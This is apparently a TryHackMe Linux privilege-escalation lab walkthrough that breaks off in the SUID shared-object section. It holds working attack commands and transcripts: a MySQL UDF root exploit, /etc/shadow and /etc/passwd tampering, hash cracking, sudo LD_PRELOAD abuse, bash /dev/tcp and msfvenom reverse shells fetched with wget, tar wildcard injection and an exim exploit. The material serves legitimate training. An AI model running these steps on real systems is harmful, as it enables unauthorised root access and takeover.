# Linux PrivEsc

Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root! SSH is available. Credentials: user:password321

[Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)

## Topic's

- Misconfigured Services
- Exploiting Writeable
- Brute Forcing Hash
- Misconfigured Binaries
- Exploiting PATH Variable
- Exploiting Crontab
- Abusing SUID/GUID
- Linux Enumeration
- Stored Passwords & Keys
- NFS Enumaration
- Kernel Exploits

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Deploy the Vulnerable Debian VM

This room is aimed at walking you through a variety of Linux Privilege Escalation techniques. To do this, you must first deploy an intentionally vulnerable Debian VM. This VM was created by Sagi Shahar as part of his [local privilege escalation workshop](https://github.com/sagishahar/lpeworkshop) but has been updated by [Tib3rius](https://twitter.com/TibSec) as part of his [Linux Privilege Escalation for OSCP](https://www.udemy.com/course/linux-privilege-escalation/?referralCode=0B0B7AA1E52B4B7F4C06) and Beyond! course on Udemy. Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Linux.

**Make sure you are connected to the [TryHackMe VPN](https://tryhackme.com/access) or using the in-browser Kali instance before trying to access the Debian VM!**

SSH should be available on port 22. You can login to the "user" account using the following command:

`ssh user@MACHINE_IP`

If you see the following message: "Are you sure you want to continue connecting (yes/no)?" type yes and press Enter.

The password for the "user" account is "**password321**".

The next tasks will walk you through different privilege escalation techniques. After each technique, you should have a root shell. **Remember to exit out of the shell and/or re-establish a session as the "user" account before starting the next task!**

1. Deploy the machine and login to the "user" account using SSH.

```
ssh user@10.10.187.8
The authenticity of host '10.10.187.8 (10.10.187.8)' can't be established.
RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.187.8' (RSA) to the list of known hosts.
user@10.10.187.8's password:
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri May 15 06:41:23 2020 from 192.168.1.125
user@debian:~$
```

`No answer needed`

2. Run the "id" command. What is the result?

`uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)`

## Service Exploits

The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a [popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Change into the /home/user/tools/mysql-udf directory:

`cd /home/user/tools/mysql-udf`

Compile the raptor_udf2.c exploit code using the following commands:

```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect to the MySQL service as the root user with a blank password:

`mysql -u root`

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`

Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!

```
rm /tmp/rootbash
exit
```

1. Read and follow along with the above.

```
user@debian:~$ cd /home/user/tools/mysql-udf
user@debian:~/tools/mysql-udf$ ls -l
total 4
-rw-r--r-- 1 user user 3378 May 15 05:55 raptor_udf2.c
user@debian:~/tools/mysql-udf$ gcc -g -c raptor_udf2.c -fPIC
user@debian:~/tools/mysql-udf$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
user@debian:~/tools/mysql-udf$
```

```
user@debian:~/tools/mysql-udf$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 35
Server version: 5.1.73-1+deb6u1 (Debian)

Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.00 sec)

mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
+------------------------------------------------------------------+
|                                                                0 |
+------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> exit
Bye
user@debian:~/tools/mysql-udf$
```

```
user@debian:~/tools/mysql-udf$ /tmp/rootbash -p
rootbash-4.1# rm /tmp/rootbash
rootbash-4.1# exit
exit
```

`No answer needed`

## Weak File Permissions - Readable /etc/shadow

The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note that the /etc/shadow file on the VM is world-readable:

`ls -l /etc/shadow`

View the contents of the /etc/shadow file:

`cat /etc/shadow`

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

Switch to the root user, using the cracked password:

`su root`

**Remember to exit out of the root shell before continuing!**

```
user@debian:~/tools/mysql-udf$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
user@debian:~/tools/mysql-udf$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::
user@debian:~/tools/mysql-udf$
```

```
kali@kali:~/CTFs/tryhackme/Linux PrivEsc$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:00:00 DONE (2020-09-30 13:21) 1.538g/s 2363p/s 2363c/s 2363C/s cuties..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```
user@debian:~/tools/mysql-udf$ su root
Password:
root@debian:/home/user/tools/mysql-udf# cd ~
root@debian:~#
```

1. What is the root user's password hash?

`$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0`

2. What hashing algorithm was used to produce the root user's password hash?

`sha512crypt`

3. What is the root user's password?

`password123`

## Weak File Permissions - Writable /etc/shadow

The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note that the /etc/shadow file on the VM is world-writable:

`ls -l /etc/shadow`

Generate a new password hash with a password of your choice:

`mkpasswd -m sha-512 newpasswordhere`

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

`su root`

**Remember to exit out of the root shell before continuing!**

1. Read and follow along with the above.

```
user@debian:~/tools/mysql-udf$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
user@debian:~/tools/mysql-udf$ mkpasswd -m sha-512 newpasswordhere
$6$a2PjThbLcYFudFW$wbNMrIVifKU/9aVvwiXc.XFDJ1l.kMEFbswTfat8wBrXiYopSnALl/WhTG.UmYY0Jf4L8Hf8vtKA3YmxGGSpy1
user@debian:~/tools/mysql-udf$
```

```
user@debian:~/tools/mysql-udf$ cat /etc/shadow
root:$6$a2PjThbLcYFudFW$wbNMrIVifKU/9aVvwiXc.XFDJ1l.kMEFbswTfat8wBrXiYopSnALl/WhTG.UmYY0Jf4L8Hf8vtKA3YmxGGSpy1:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::
```

```
user@debian:~/tools/mysql-udf$ su root
Password:
root@debian:/home/user/tools/mysql-udf# cd ~
root@debian:~#
root@debian:~# exit
exit
user@debian:~/tools/mysql-udf$
```

`No answer needed`

## Weak File Permissions - Writable /etc/passwd

The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

Note that the /etc/passwd file is world-writable:

`ls -l /etc/passwd`

Generate a new password hash with a password of your choice:

`openssl passwd newpasswordhere`

Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

Switch to the root user, using the new password:

`su root`

Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

Now switch to the newroot user, using the new password:

`su newroot`

**Remember to exit out of the root shell before continuing!**

```
user@debian:~/tools/mysql-udf$ openssl passwd newpasswordhere
Warning: truncating password to 8 characters
auXs47FeobsN.
user@debian:~/tools/mysql-udf$ ls -l /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
user@debian:~/tools/mysql-udf$
```

```
user@debian:~/tools/mysql-udf$ cat /etc/passwd
root:auXs47FeobsN.:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:user,,,:/home/user:/bin/bash
statd:x:103:65534::/var/lib/nfs:/bin/false
mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
```

```
user@debian:~/tools/mysql-udf$ su root
Password:
root@debian:/home/user/tools/mysql-udf# cd ~
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:~# exit
exit
user@debian:~/tools/mysql-udf$
```

1. Run the "id" command as the newroot user. What is the result?

## Sudo - Shell Escape Sequences

List the programs which sudo allows your user to run:

`sudo -l`

Visit GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io/)) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.

For an extra challenge, try to gain a root shell using all the programs on the list!

**Remember to exit out of the root shell before continuing!**

```
user@debian:~/tools/mysql-udf$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

1. How many programs is "user" allowed to run via sudo?

`11`

2. One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?

- [iftop](https://gtfobins.github.io/#iftop)
- [find](https://gtfobins.github.io/#find)
- [nano](https://gtfobins.github.io/#nano)
- [vim](https://gtfobins.github.io/#vim)
- [man](https://gtfobins.github.io/#man)
- [awk](https://gtfobins.github.io/#awk)
- [less](https://gtfobins.github.io/#less)
- [ftp](https://gtfobins.github.io/#ftp)
- [apache2](https://gtfobins.github.io/#apache2)
- [more](https://gtfobins.github.io/#more)

`apache2`

1. Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.

`No answer needed`

## Sudo - Environment Variables

Sudo can be configured to inherit certain environment variables from the user's environment.

Check which environment variables are inherited (look for the env_keep options):

`sudo -l`

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c:

`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`

Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:

`sudo LD_PRELOAD=/tmp/preload.so program-name-here`

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run ldd against the apache2 program file to see which shared libraries are used by the program:

`ldd /usr/sbin/apache2`

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:

`gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`

Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

`sudo LD_LIBRARY_PATH=/tmp apache2`

A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.

**Remember to exit out of the root shell before continuing!**

```
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so nano
root@debian:/home/user# cd ~
user@debian:~$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fff853b3000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f8b23ed1000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f8b23cad000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f8b23a73000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f8b23857000)
        libc.so.6 => /lib/libc.so.6 (0x00007f8b234eb000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f8b232e6000)
        librt.so.1 => /lib/librt.so.1 (0x00007f8b230de000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f8b22ea7000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007f8b22ca2000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f8b22a7a000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f8b2438e000)
user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
root@debian:/home/user# exit
exit
apache2: bad user name ${APACHE_RUN_USER}
user@debian:~$
```

1. Read and follow along with the above.

`No answer needed`

## Cron Jobs - File Permissions

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

View the contents of the system-wide crontab:

`cat /etc/crontab`

There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

Locate the full path of the overwrite.sh file:

`locate overwrite.sh`

Note that the file is world-writable:

`ls -l /usr/local/bin/overwrite.sh`

Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

`nc -nvlp 4444`

**Remember to exit out of the root shell and remove the reverse shell code before continuing!**

```
kali@kali:~/CTFs/tryhackme/Linux PrivEsc$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
user@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

```
user@debian:~$ locate overwrite.sh
locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 138.1 days)
/usr/local/bin/overwrite.sh
user@debian:~$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
```

```
user@debian:~$ nano /usr/local/bin/overwrite.sh
user@debian:~$ cat /usr/local/bin/overwrite.sh
#!/bin/bash
bash -i >& /dev/tcp/10.8.106.222/9001 0>&1
```

```
kali@kali:~/CTFs/tryhackme/Linux PrivEsc$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.206.164] 34650
bash: no job control in this shell
root@debian:~# whoami
whoami
root
root@debian:~#
```

1. Read and follow along with the above.

`No answer needed`

## Cron Jobs - PATH Environment Variable

View the contents of the system-wide crontab:

`cat /etc/crontab`

Note that the PATH variable starts with /home/user which is our user's home directory.

Create a file called overwrite.sh in your home directory with the following contents:

```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable:

`chmod +x /home/user/overwrite.sh`

Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`

**Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!**

```
rm /tmp/rootbash
exit
```

1. What is the value of the PATH variable in /etc/crontab?

```
cat /etc/crontab
```

`home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`

## Cron Jobs - Wildcards

View the contents of the other cron job script:

`cat /usr/local/bin/compress.sh`

Note that the tar command is being run with a wildcard (\*) in your home directory.

Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`

Transfer the shell.elf file to **/home/user/** on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use **wget**). Make sure the file is executable:

`chmod +x /home/user/shell.elf`

Create these two files in /home/user:

```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

When the tar command in the cron job runs, the wildcard (\*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

`nc -nvlp 4444`

**Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:**

```
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```

1. Read and follow along with the above.

```
kali@kali:~/CTFs/tryhackme/Linux PrivEsc$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.106.222 LPORT=9001 -f elf -o shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell.elf
```

```
kali@kali:~/CTFs/tryhackme/Linux PrivEsc$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.206.164 - - [30/Sep/2020 15:01:57] "GET /shell.elf HTTP/1.0" 200 -
```

```
user@debian:~$ wget http://10.8.106.222/shell.elf
--2020-09-30 09:01:58--  http://10.8.106.222/shell.elf
Connecting to 10.8.106.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 194 [application/octet-stream]
Saving to: “shell.elf”

100%[====================================================>] 194         --.-K/s   in 0s

2020-09-30 09:01:58 (34.0 MB/s) - “shell.elf” saved [194/194]

user@debian:~$ chmod +x /home/user/shell.elf
user@debian:~$ touch /home/user/--checkpoint=1
user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf
user@debian:~$
```

```
kali@kali:~/CTFs/tryhackme/Linux PrivEsc$ nc -nvlp 9001listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.206.164] 34653

whoami
root
```

```
user@debian:~$ rm /home/user/shell.elf
user@debian:~$ rm /home/user/--checkpoint=1
user@debian:~$ rm /home/user/--checkpoint-action=exec=shell.elf
user@debian:~$
```

`No answer needed`

## SUID / SGID Executables - Known Exploits

Find all the SUID/SGID executables on the Debian VM:

`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. [Exploit-DB](https://www.exploit-db.com/), Google, and GitHub are good places to search!

A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at **/home/user/tools/suid/exim/cve-2016-1531.sh.**

Run the exploit script to gain a root shell:

`/home/user/tools/suid/exim/cve-2016-1531.sh`

**Remember to exit out of the root shell before continuing!**

```
user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry

-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
```

- [Exim 4.84-3 - Local Privilege Escalation](https://www.exploit-db.com/exploits/39535)

```
user@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh
[ CVE-2016-1531 local root exploit
sh-4.1# whoami
root
sh-4.1#
```

1. Read and follow along with the above.

`No answer needed`

## SUID / SGID Executables - Shared Object Injection

The **/usr/local/bin/suid-so** SUID executable is vulnerable to shared object injection.

First, execute the file and note that currently it displays a progress bar before exiting:

`/usr/local/bin/suid-so`

Run **strace** on the file and search the output for open/access calls and for "no such file" errors:

`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`

